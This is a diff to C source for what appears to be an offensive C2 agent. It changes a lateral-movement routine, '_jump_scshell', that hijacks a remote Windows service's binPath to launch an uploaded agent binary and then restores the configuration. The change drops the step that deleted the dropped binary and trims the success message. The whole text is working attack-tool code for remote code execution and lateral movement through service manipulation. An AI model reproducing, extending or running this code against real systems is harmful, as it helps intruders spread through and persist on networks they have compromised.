@@ -1260,18 +1260,16 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
         return FALSE;
     }
 
-    /* 7. Restore original binPath immediately — agent process is already running.
-     * This matches the Adaptix scshell approach: restore before cleanup. */
-    pChangeCfg(hSvc, origSvcType, origStartType,
+    /* 7. Restore original binPath immediately (matches Adaptix scshell).
+     * SERVICE_NO_CHANGE for type = don't touch it. Binary stays on disk —
+     * the agent process has it locked so DeleteFileW would fail anyway. */
+    pChangeCfg(hSvc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
     pCloseSH(hSvc);
     pCloseSH(hSCM);
 
-    /* 8. Delete uploaded binary — it's already loaded in memory by the agent process */
-    pDeleteFile(remotePath);
-
-    snprintf(msg, sizeof(msg), "[+] Service started on %ls (agent running as PID)\n", target);
+    snprintf(msg, sizeof(msg), "[+] Service started on %ls\n", target);
     buf_append(out, msg, (DWORD)strlen(msg));
     return TRUE;
 }
